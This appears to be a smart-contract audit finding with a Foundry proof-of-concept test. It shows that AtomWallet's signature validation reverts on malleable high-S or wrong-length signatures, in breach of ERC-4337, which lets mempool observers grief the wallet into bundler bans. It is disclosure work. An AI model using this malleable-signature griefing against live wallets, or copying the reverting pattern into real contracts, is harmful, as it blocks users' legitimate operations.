  "body": "## Finding description and impact\n\n\nDescription\n\n\nThe ERC-4337 specification strictly mandates that an account's validateUserOp function MUST NOT revert on signature mismatch. Instead, it must return SIG_VALIDATION_FAILED (which evaluates to the magic value 1). This rule exists so that bundlers can accurately simulate and reject operations without penalizing the underlying account or factory for producing undocumented reverts during the validation phase.\n\n\n\n\n\nIn AtomWallet.sol, the overridden _validateSignature function explicitly intercepts ECDSA.RecoverError.InvalidSignatureS (malleable S-values where s > secp256k1.n/2) and ECDSA.RecoverError.InvalidSignatureLength, and triggers a hard revert with custom errors (AtomWallet_InvalidSignatureS, AtomWallet_InvalidSignatureLength).\n\n\n\n\nfunction _validateSignature(\n        PackedUserOperation calldata userOp,\n        bytes32 userOpHash\n    )\n        internal\n        virtual\n        override\n        returns (uint256 validationData)\n    {\n        // ...\n        (address recovered, ECDSA.RecoverError recoverError, bytes32 errorArg) = \n\nECDSA.tryRecover(hash, signature);\n\n        if (recoverError == ECDSA.RecoverError.InvalidSignatureLength) {\n            revert AtomWallet_InvalidSignatureLength(uint256(errorArg));\n        } else if (recoverError == ECDSA.RecoverError.InvalidSignatureS) {\n            revert AtomWallet_InvalidSignatureS(errorArg);\n        } else if (recoverError == ECDSA.RecoverError.InvalidSignature) {\n            return _packValidationData(true, validUntil, validAfter);\n        }\n        // ...\n\n\n\nBy reverting, the wallet violates the core EIP-4337 specification. If a user, bundler, or malicious actor submits a UserOperation with an invalid-length or high-S malleable signature, the transaction reverts entirely. The bundler treats this as an internal account failure rather than a clean signature rejection, leading to the Account or Factory being penalized, throttled, or outright banned by mempool validators.\n\n\n\n\nImpact\n\n\nThis enables a trivial Denial-of-Service (DoS) and griefing vector. Any actor observing a valid UserOperation in the open mempool can broadcast an identical UserOp with a flipped, malleable S-value (s' = n - s). When the bundler simulates this bad signature, the AtomWallet reverts. The bundler's reputation scoring will penalize the wallet, effectively blocking legitimate operations from being processed by the standard ERC-4337 infrastructure.\n\n\n\n\n## Recommended mitigation steps\n\n-        if (recoverError == ECDSA.RecoverError.InvalidSignatureLength) {\n-            revert AtomWallet_InvalidSignatureLength(uint256(errorArg));\n-        } else if (recoverError == ECDSA.RecoverError.InvalidSignatureS) {\n-            revert AtomWallet_InvalidSignatureS(errorArg);\n-        } else if (recoverError == ECDSA.RecoverError.InvalidSignature) {\n-            return _packValidationData(true, validUntil, validAfter);\n-        }\n+        if (recoverError != ECDSA.RecoverError.NoError) {\n+            return _packValidationData(true, validUntil, validAfter);\n+        }",
  "proof_of_concept": "The following Foundry test demonstrates the violation. Place this in tests/PoCCore.t.sol\n and run forge test --match-test submissionValidity --fork-url https://mainnet.base.org/. The test asserts that validateUserOp reverts instead of returning gracefully.\n\n\n\n\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\n\npragma solidity 0.8.29;\nimport { BaseTest } from \"./BaseTest.t.sol\";\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\ncontract PoCCore is BaseTest {\n    function test_submissionValidity() external {\n        // Step 1: Create an atom to get a real AtomWallet logic\n        uint256 atomCost = protocol.multiVault.getAtomCost();\n        resetPrank(users.alice);\n        bytes[] memory atomData = new bytes[](1);\n        atomData[0] = abi.encodePacked(\"test-atom\");\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = atomCost;\n        bytes32[] memory atomIds = protocol.multiVault.createAtoms{ value: atomCost }(atomData, amounts);\n        // Step 2: Deploy the AtomWallet\n        address atomWalletAddr = protocol.atomWalletFactory.deployAtomWallet(atomIds[0]);\n        AtomWallet atomWallet = AtomWallet(payable(atomWalletAddr));\n        // Step 3: Construct a UserOperation with a high-S (malleable) signature\n        // Any S value > secp256k1.n/2 triggers ECDSA.RecoverError.InvalidSignatureS\n        bytes32 highS = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140));\n        bytes32 r = bytes32(uint256(1)); \n        uint8   v = 27;\n        bytes memory badSig = abi.encodePacked(r, highS, v);\n        PackedUserOperation memory userOp = PackedUserOperation({\n            sender:               atomWalletAddr,\n            nonce:                0,\n            initCode:             hex\"\",\n            callData:             hex\"\",\n            accountGasLimits:     bytes32(uint256(200_000) << 128 | uint256(200_000)),\n            preVerificationGas:   21_000,\n            gasFees:              bytes32(0),\n            paymasterAndData:     hex\"\",\n            signature:            badSig\n        });\n        bytes32 userOpHash = keccak256(abi.encode(userOp, block.chainid));\n        vm.stopPrank();\n        vm.prank(address(atomWallet.entryPoint()));\n        bool reverted = false;\n        try atomWallet.validateUserOp(userOp, userOpHash, 0) {\n            // Unreachable\n        } catch (bytes memory err) {\n            reverted = true;\n            bytes4 selector = bytes4(err);\n            bytes4 expectedSelector = bytes4(keccak256(\"AtomWallet_InvalidSignatureS(bytes32)\"));\n            \n            // This assertion confirms the account reverted instead of returning SIG_VALIDATION_FAILED\n            assertTrue(selector == expectedSelector, \"BUG CONFIRMED: AtomWallet reverted with InvalidSignatureS\");\n        }\n        assertTrue(reverted, \"Expected revert breaking ERC-4337\");\n    }\n}",
